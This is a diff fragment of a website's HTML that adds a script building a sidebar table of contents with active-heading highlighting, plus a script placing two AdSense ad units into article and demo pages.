+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
